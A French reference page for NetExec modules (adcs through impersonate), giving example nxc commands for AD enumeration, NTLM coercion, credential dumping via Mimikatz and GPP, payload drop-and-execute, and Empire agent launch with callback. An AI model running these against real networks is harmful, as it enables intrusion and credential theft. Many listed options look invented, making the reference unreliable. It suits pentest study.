# Modules

⚠️ **Avertissement :** Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

### Documentation des Modules NetExec

Voici une documentation complète et détaillée de chaque module de NetExec, classée par ordre alphabétique. Chaque module est accompagné d'une description, du protocole pris en charge, des paramètres, des exemples de commandes typiques, ainsi que des usages avancés.

***

### Module : `adcs`

**1. Nom du Module : `adcs`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d'exploiter les Active Directory Certificate Services (ADCS) pour obtenir des certificats ou des informations sensibles.

**2. Options / Paramètres**

* `--CERTTEMPLATE` : Nom du modèle de certificat à utiliser.
* `--DC` : Contrôleur de domaine cible.
* `--OUTPUT` : Fichier de sortie pour les certificats obtenus.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M adcs -o CERTTEMPLATE=UserTemplate
```

**Explication** :

* Cette commande utilise le module `adcs` pour demander un certificat à l'Active Directory Certificate Services, avec le modèle `UserTemplate`.

**Commande avec fichier de sortie** :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M adcs -o CERTTEMPLATE=UserTemplate,OUTPUT=cert.pfx
```

**Explication** :

* Les certificats sont sauvegardés dans le fichier `cert.pfx`.

**4. Commandes Avancées**

Commande pour spécifier un contrôleur de domaine particulier :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M adcs -o CERTTEMPLATE=UserTemplate,DC=dc.example.com
```

**Explication** :

* Exécute le module en ciblant le contrôleur de domaine `dc.example.com`.

***

### Module : `add-computer`

**1. Nom du Module : `add-computer`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d'ajouter un compte machine à un domaine Active Directory.

**2. Options / Paramètres**

* `--COMPUTERNAME` : Nom du compte machine à ajouter.
* `--PASSWORD` : Mot de passe associé au compte machine.
* `--DC` : Contrôleur de domaine cible.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M add-computer -o COMPUTERNAME=NewComputer,PASSWORD=Password123
```

**Explication** :

* Ajoute un compte machine nommé `NewComputer` avec le mot de passe `Password123` sur le contrôleur de domaine spécifié.

**4. Commandes Avancées**

Commande avec spécification d'un contrôleur de domaine :

```bash
nxc ldap 192.168.1.10 -u user -p 'password' -M add-computer -o COMPUTERNAME=NewComputer,PASSWORD=Password123,DC=dc.example.com
```

**Explication** :

* Ajoute le compte machine sur le contrôleur de domaine `dc.example.com`.

***

### Module : `bitlocker`

**1. Nom du Module : `bitlocker`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module interroge les cibles pour collecter des informations sur BitLocker, y compris les clés de récupération.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour sauvegarder les informations collectées.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc smb 192.168.1.10 -u admin -p 'password' -M bitlocker
```

**Explication** :

* Récupère les informations BitLocker de la cible à l’adresse `192.168.1.10`.

**Commande avec fichier de sortie** :

```bash
nxc smb 192.168.1.10 -u admin -p 'password' -M bitlocker -o OUTPUT=bitlocker_info.txt
```

**Explication** :

* Sauvegarde les informations collectées dans `bitlocker_info.txt`.

**4. Commandes Avancées**

Commande avec sortie détaillée :

```bash
nxc smb 192.168.1.10 -u admin -p 'password' -M bitlocker -o VERBOSE=1
```

**Explication** :

* Fournit une sortie plus détaillée des informations collectées.

***

### Module : `coerce_plus`

**1. Nom du Module : `coerce_plus`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module utilise des méthodes de coercition pour forcer une cible à s’authentifier sur un autre hôte.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur où rediriger l’authentification.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```bash
nxc smb 192.168.1.10 -M coerce_plus -o LISTEN=192.168.1.20
```

**Explication** :

* Utilise la coercition pour forcer la cible `192.168.1.10` à s’authentifier sur l’hôte `192.168.1.20`.

**Commande avec sortie détaillée** :

```bash
nxc smb 192.168.1.10 -M coerce_plus -o LISTEN=192.168.1.20,VERBOSE=1
```

**Explication** :

* Fournit une sortie détaillée pour le débogage.

**4. Commandes Avancées**

Commande multi-cibles :

```bash
nxc smb targets.txt -M coerce_plus -o LISTEN=192.168.1.20
```

**Explication** :

* Applique la coercition à toutes les cibles listées dans `targets.txt`.

***

### Module : `daclread`

**1. Nom du Module : `daclread`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module extrait les listes de contrôle d'accès discrétionnaire (DACL) pour des objets Active Directory spécifiés.

**2. Options / Paramètres**

* `--OBJECT` : Nom de l'objet cible pour lequel les DACL doivent être extraits.
* `--DC` : Contrôleur de domaine cible.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M daclread -o OBJECT=CN=Users,DC=example,DC=com
```

**Explication** :

* Extrait les DACL pour l'objet `CN=Users,DC=example,DC=com` depuis le contrôleur de domaine spécifié.

**4. Commandes Avancées**

Commande avec spécification d'un contrôleur de domaine :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M daclread -o OBJECT=CN=Users,DC=example,DC=com,DC=dc.example.com
```

**Explication** :

* Extrait les DACL pour un objet spécifique et les récupère depuis `dc.example.com`.

***

### Module : `dfscoerce`

**1. Nom du Module : `dfscoerce`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exploite une vulnérabilité dans le service DFS pour forcer une authentification NTLM sur un autre hôte.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte écouteur pour capturer les authentifications NTLM.
* `--VERBOSE` : Active une sortie détaillée.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M dfscoerce -o LISTEN=192.168.1.20
```

**Explication** :

* Exploite la vulnérabilité DFS pour forcer une authentification NTLM de la cible `192.168.1.10` vers l’hôte `192.168.1.20`.

**4. Commandes Avancées**

Commande avec sortie détaillée :

```
nxc smb 192.168.1.10 -M dfscoerce -o LISTEN=192.168.1.20,VERBOSE=1
```

**Explication** :

* Fournit des informations supplémentaires pendant l'exécution du module.

***

### Module : `drop-sc`

**1. Nom du Module : `drop-sc`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet de déposer un fichier de service sur une cible Windows via SMB.

**2. Options / Paramètres**

* `--FILE` : Chemin local vers le fichier à déposer sur la cible.
* `--TARGETPATH` : Chemin distant où le fichier sera déposé.
* `--EXECUTE` : Indique si le fichier doit être exécuté après dépôt (valeurs : `true` ou `false`).

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M drop-sc -o FILE=/path/to/file.exe,TARGETPATH=C:\Windows\Temp\file.exe
```

**Explication** :

* Dépose le fichier `file.exe` dans le répertoire temporaire de la cible.

**Commande avec exécution automatique** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M drop-sc -o FILE=/path/to/file.exe,TARGETPATH=C:\Windows\Temp\file.exe,EXECUTE=true
```

**Explication** :

* Après dépôt, exécute automatiquement le fichier déposé.

**4. Commandes Avancées**

Commande multi-cibles avec exécution automatique :

```
nxc smb targets.txt -M drop-sc -o FILE=/path/to/file.exe,TARGETPATH=C:\Windows\Temp\file.exe,EXECUTE=true
```

**Explication** :

* Dépose et exécute le fichier sur toutes les cibles listées dans `targets.txt`.

***

### Module : `empire_exec`

**1. Nom du Module : `empire_exec`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exécute un agent Empire sur une cible via SMB.

**2. Options / Paramètres**

* `--LISTEN` : Adresse IP de l’hôte Empire où les agents doivent se connecter.
* `--PORT` : Port à utiliser pour la communication avec Empire.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M empire_exec -o LISTEN=192.168.1.20,PORT=8080
```

**Explication** :

* Lance un agent Empire sur la cible et configure la connexion vers l’hôte `192.168.1.20` via le port `8080`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M empire_exec -o LISTEN=192.168.1.20,PORT=8080
```

**Explication** :

* Exécute un agent Empire sur toutes les cibles définies dans `targets.txt`.

***

### Module : `enum_av`

**1. Nom du Module : `enum_av`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d'énumérer les solutions antivirus présentes sur une cible Windows.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M enum_av
```

**Explication** :

* Énumère les antivirus installés sur la cible `192.168.1.10`.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M enum_av -o OUTPUT=antivirus_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `antivirus_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie vers fichier unique :

```
nxc smb targets.txt -M enum_av -o OUTPUT=all_antivirus_list.txt
```

**Explication** :

* Compile les antivirus détectés sur toutes les cibles dans un fichier unique.

***

### Module : `enum_ca`

**1. Nom du Module : `enum_ca`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les autorités de certification (Certificate Authorities) disponibles dans Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_ca
```

**Explication** :

* Énumère les autorités de certification disponibles sur le contrôleur de domaine spécifié.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_ca -o OUTPUT=ca_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `ca_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie détaillée :

```
nxc ldap targets.txt -M enum_ca -o OUTPUT=all_ca_list.txt
```

**Explication** :

* Regroupe les autorités de certification énumérées sur toutes les cibles définies dans `targets.txt` dans un fichier unique.

***

### Module : `enum_dns`

**1. Nom du Module : `enum_dns`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module interroge Active Directory pour énumérer les enregistrements DNS.

**2. Options / Paramètres**

* `--ZONE` : Zone DNS à interroger (par défaut : toutes les zones).
* `--OUTPUT` : Fichier de sortie pour sauvegarder les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_dns
```

**Explication** :

* Énumère tous les enregistrements DNS dans Active Directory pour la cible spécifiée.

**Commande pour une zone spécifique** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_dns -o ZONE=example.com
```

**Explication** :

* Limite l'interrogation aux enregistrements DNS pour la zone `example.com`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc ldap targets.txt -M enum_dns -o OUTPUT=dns_records_all.txt
```

**Explication** :

* Compile les enregistrements DNS de toutes les cibles dans un seul fichier de sortie.

***

### Module : `enum_impersonate`

**1. Nom du Module : `enum_impersonate`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les comptes avec des droits d’usurpation d'identité sur un domaine Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_impersonate
```

**Explication** :

* Énumère les comptes avec des droits d’usurpation sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_impersonate -o OUTPUT=impersonate_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `impersonate_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc ldap targets.txt -M enum_impersonate -o OUTPUT=all_impersonate_list.txt
```

**Explication** :

* Regroupe les résultats des comptes d’usurpation de toutes les cibles dans un seul fichier de sortie.

***

### Module : `enum_links`

**1. Nom du Module : `enum_links`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d’énumérer les liens entre serveurs sur Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_links
```

**Explication** :

* Énumère les liens de serveur sur la cible Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_links -o OUTPUT=links_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `links_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc ldap targets.txt -M enum_links -o OUTPUT=all_links_list.txt
```

**Explication** :

* Compile les liens de serveurs énumérés sur toutes les cibles dans un fichier unique.

***

### Module : `enum_logins`

**1. Nom du Module : `enum_logins`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d’énumérer les sessions de connexion actives sur un hôte cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M enum_logins
```

**Explication** :

* Énumère les connexions actives sur la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M enum_logins -o OUTPUT=logins_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `logins_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc smb targets.txt -M enum_logins -o OUTPUT=all_logins_list.txt
```

**Explication** :

* Compile les connexions actives détectées sur toutes les cibles dans un fichier unique.

***

### Module : `enum_trusts`

**1. Nom du Module : `enum_trusts`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les relations de confiance entre domaines Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_trusts
```

**Explication** :

* Énumère les relations de confiance entre domaines sur la cible Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M enum_trusts -o OUTPUT=trusts_list.txt
```

**Explication** :

* Sauvegarde les résultats dans `trusts_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles avec sortie globale :

```
nxc ldap targets.txt -M enum_trusts -o OUTPUT=all_trusts_list.txt
```

**Explication** :

* Compile les relations de confiance détectées sur toutes les cibles dans un fichier unique.

***

### Module : `exec_on_link`

**1. Nom du Module : `exec_on_link`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d’exécuter des commandes ou des fichiers binaires via des liens inter-serveurs sur un réseau cible.

**2. Options / Paramètres**

* `--COMMAND` : Commande ou fichier à exécuter.
* `--LINK` : Nom du lien inter-serveur à utiliser pour exécuter la commande.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -M exec_on_link -o COMMAND="whoami",LINK=example-link
```

**Explication** :

* Exécute la commande `whoami` via le lien nommé `example-link`.

**Commande avec spécification avancée** :

```
nxc smb 192.168.1.10 -M exec_on_link -o COMMAND="C:\\path\\to\\script.bat",LINK=example-link
```

**Explication** :

* Exécute un script batch à l’emplacement spécifié via le lien inter-serveur donné.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M exec_on_link -o COMMAND="dir",LINK=example-link
```

**Explication** :

* Exécute la commande `dir` sur toutes les cibles spécifiées via le lien inter-serveur `example-link`.

***

### Module : `find-computer`

**1. Nom du Module : `find-computer`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet de rechercher des objets ordinateur dans Active Directory en fonction de critères spécifiques.

**2. Options / Paramètres**

* `--FILTER` : Critère de filtrage des objets (par défaut : tous les objets ordinateur).
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M find-computer
```

**Explication** :

* Liste tous les objets ordinateur dans le domaine Active Directory spécifié.

**Commande avec filtre** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M find-computer -o FILTER="OU=Sales"
```

**Explication** :

* Recherche les objets ordinateur dans l’unité organisationnelle `Sales`.

**4. Commandes Avancées**

Commande avec sortie détaillée :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M find-computer -o FILTER="OU=HR",OUTPUT=computers_list.txt
```

**Explication** :

* Enregistre la liste des ordinateurs trouvés dans `computers_list.txt`.

***

### Module : `firefox`

**1. Nom du Module : `firefox`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module collecte les informations de configuration et les données sensibles associées à Firefox sur un hôte cible.

**2. Options / Paramètres**

* `--PROFILE` : Spécifie le chemin du profil Firefox (par défaut : profil par défaut).
* `--OUTPUT` : Fichier de sortie pour sauvegarder les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M firefox
```

**Explication** :

* Extrait les données associées à Firefox depuis le profil par défaut de l’hôte cible.

**Commande avec profil spécifique** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M firefox -o PROFILE="C:\\Users\\User\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\profile"
```

**Explication** :

* Spécifie un chemin de profil Firefox personnalisé pour extraire les données.

**4. Commandes Avancées**

Commande avec sauvegarde des résultats :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M firefox -o OUTPUT=firefox_data.txt
```

**Explication** :

* Sauvegarde les données extraites dans `firefox_data.txt`.

***

### Module : `get-desc-users`

**1. Nom du Module : `get-desc-users`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module permet d'extraire les descriptions associées aux comptes utilisateurs dans Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-desc-users
```

**Explication** :

* Extrait les descriptions de tous les utilisateurs dans le domaine Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-desc-users -o OUTPUT=descriptions.txt
```

**Explication** :

* Sauvegarde les descriptions des utilisateurs dans `descriptions.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M get-desc-users -o OUTPUT=all_descriptions.txt
```

**Explication** :

* Compile les descriptions des utilisateurs pour toutes les cibles dans un fichier unique.

***

### Module : `get-network`

**1. Nom du Module : `get-network`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les informations sur le réseau et les sous-réseaux disponibles dans Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-network
```

**Explication** :

* Énumère les sous-réseaux et autres informations réseau de l’Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-network -o OUTPUT=network_info.txt
```

**Explication** :

* Sauvegarde les informations réseau collectées dans `network_info.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M get-network -o OUTPUT=all_networks.txt
```

**Explication** :

* Compile les informations réseau de toutes les cibles dans un fichier unique.

***

### Module : `get-unixUserPassword`

**1. Nom du Module : `get-unixUserPassword`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module récupère les mots de passe des utilisateurs Unix configurés dans un domaine Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-unixUserPassword
```

**Explication** :

* Extrait les mots de passe des utilisateurs Unix configurés dans Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-unixUserPassword -o OUTPUT=unix_passwords.txt
```

**Explication** :

* Sauvegarde les mots de passe extraits dans `unix_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M get-unixUserPassword -o OUTPUT=all_unix_passwords.txt
```

**Explication** :

* Compile les mots de passe des utilisateurs Unix pour toutes les cibles dans un fichier unique.

***

### Module : `get-userPassword`

**1. Nom du Module : `get-userPassword`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module extrait les mots de passe des utilisateurs configurés dans Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-userPassword
```

**Explication** :

* Extrait les mots de passe des utilisateurs configurés dans Active Directory.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M get-userPassword -o OUTPUT=user_passwords.txt
```

**Explication** :

* Sauvegarde les mots de passe extraits dans `user_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M get-userPassword -o OUTPUT=all_user_passwords.txt
```

**Explication** :

* Compile les mots de passe des utilisateurs pour toutes les cibles dans un fichier unique.

***

### Module : `get_netconnections`

**1. Nom du Module : `get_netconnections`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module énumère les connexions réseau actives sur un hôte cible.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M get_netconnections
```

**Explication** :

* Énumère les connexions réseau actives sur l’hôte cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M get_netconnections -o OUTPUT=connections_list.txt
```

**Explication** :

* Sauvegarde les connexions détectées dans `connections_list.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M get_netconnections -o OUTPUT=all_connections_list.txt
```

**Explication** :

* Compile les connexions réseau actives détectées sur toutes les cibles dans un fichier unique.

***

### Module : `gpp_autologin`

**1. Nom du Module : `gpp_autologin`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module recherche les informations d’autologin configurées via Group Policy Preferences (GPP) sur les hôtes cibles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M gpp_autologin
```

**Explication** :

* Recherche les configurations d’autologin sur l’hôte cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M gpp_autologin -o OUTPUT=autologin_info.txt
```

**Explication** :

* Sauvegarde les informations détectées dans `autologin_info.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M gpp_autologin -o OUTPUT=all_autologin_info.txt
```

**Explication** :

* Compile les configurations d’autologin détectées sur toutes les cibles dans un fichier unique.

***

### Module : `gpp_password`

**1. Nom du Module : `gpp_password`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module récupère les mots de passe stockés dans les Group Policy Preferences (GPP) sur les hôtes cibles.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M gpp_password
```

**Explication** :

* Recherche et récupère les mots de passe des GPP configurés sur l’hôte cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M gpp_password -o OUTPUT=gpp_passwords.txt
```

**Explication** :

* Sauvegarde les mots de passe détectés dans `gpp_passwords.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M gpp_password -o OUTPUT=all_gpp_passwords.txt
```

**Explication** :

* Compile les mots de passe détectés sur toutes les cibles dans un fichier unique.

***

### Module : `group-mem`

**1. Nom du Module : `group-mem`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module liste les membres d'un groupe Active Directory spécifique.

**2. Options / Paramètres**

* `--GROUP` : Nom du groupe cible.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M group-mem -o GROUP=Administrators
```

**Explication** :

* Liste les membres du groupe `Administrators` sur le domaine Active Directory spécifié.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M group-mem -o GROUP=Administrators,OUTPUT=members.txt
```

**Explication** :

* Sauvegarde les membres du groupe dans `members.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M group-mem -o GROUP=Administrators,OUTPUT=all_members.txt
```

**Explication** :

* Compile les membres du groupe `Administrators` pour toutes les cibles dans un fichier unique.

***

### Module : `groupmembership`

**1. Nom du Module : `groupmembership`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les appartenances à tous les groupes pour un utilisateur spécifique.

**2. Options / Paramètres**

* `--USER` : Nom de l’utilisateur cible.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M groupmembership -o USER=john.doe
```

**Explication** :

* Énumère les appartenances aux groupes pour l’utilisateur `john.doe` sur le domaine Active Directory spécifié.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M groupmembership -o USER=john.doe,OUTPUT=groups.txt
```

**Explication** :

* Sauvegarde les appartenances aux groupes dans `groups.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M groupmembership -o USER=john.doe,OUTPUT=all_groups.txt
```

**Explication** :

* Compile les appartenances aux groupes pour l’utilisateur `john.doe` sur toutes les cibles dans un fichier unique.

***

### Module : `handlekatz`

**1. Nom du Module : `handlekatz`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module exécute la collecte des informations d’identification à l’aide de Mimikatz sur une cible distante.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les informations collectées.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M handlekatz
```

**Explication** :

* Exécute Mimikatz sur la cible pour récupérer les informations d’identification.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M handlekatz -o OUTPUT=credentials.txt
```

**Explication** :

* Sauvegarde les informations d’identification récupérées dans `credentials.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M handlekatz -o OUTPUT=all_credentials.txt
```

**Explication** :

* Compile les informations d’identification collectées sur toutes les cibles dans un fichier unique.

***

### Module : `hyperv-host`

**1. Nom du Module : `hyperv-host`**

* **Protocole pris en charge** : LDAP
* **Description** : Ce module énumère les configurations des hôtes Hyper-V sur un domaine Active Directory.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M hyperv-host
```

**Explication** :

* Extrait les informations de configuration des hôtes Hyper-V sur la cible spécifiée.

**Commande avec fichier de sortie** :

```
nxc ldap 192.168.1.10 -u admin -p 'password' -M hyperv-host -o OUTPUT=hyperv_hosts.txt
```

**Explication** :

* Sauvegarde les configurations des hôtes Hyper-V dans `hyperv_hosts.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc ldap targets.txt -M hyperv-host -o OUTPUT=all_hyperv_hosts.txt
```

**Explication** :

* Compile les informations des hôtes Hyper-V de toutes les cibles dans un fichier unique.

***

### Module : `iis`

**1. Nom du Module : `iis`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d'interroger les serveurs IIS (Internet Information Services) pour collecter des informations sur leurs configurations.

**2. Options / Paramètres**

* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M iis
```

**Explication** :

* Interroge le serveur IIS sur la cible pour collecter des informations de configuration.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M iis -o OUTPUT=iis_config.txt
```

**Explication** :

* Sauvegarde les configurations IIS collectées dans `iis_config.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
nxc smb targets.txt -M iis -o OUTPUT=all_iis_configs.txt
```

**Explication** :

* Compile les configurations IIS de toutes les cibles dans un fichier unique.

***

### Module : `impersonate`

**1. Nom du Module : `impersonate`**

* **Protocole pris en charge** : SMB
* **Description** : Ce module permet d'exploiter des permissions pour usurper un contexte utilisateur spécifique sur un hôte cible.

**2. Options / Paramètres**

* `--USER` : Nom de l’utilisateur à usurper.
* `--OUTPUT` : Fichier de sortie pour enregistrer les résultats.

**3. Commandes Typiques avec Explications**

**Commande de base** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M impersonate -o USER=john.doe
```

**Explication** :

* Tente d’usurper le contexte de l’utilisateur `john.doe` sur la cible.

**Commande avec fichier de sortie** :

```
nxc smb 192.168.1.10 -u admin -p 'password' -M impersonate -o USER=john.doe,OUTPUT=impersonate_results.txt
```

**Explication** :

* Sauvegarde les résultats de l’usurpation dans `impersonate_results.txt`.

**4. Commandes Avancées**

Commande multi-cibles :

```
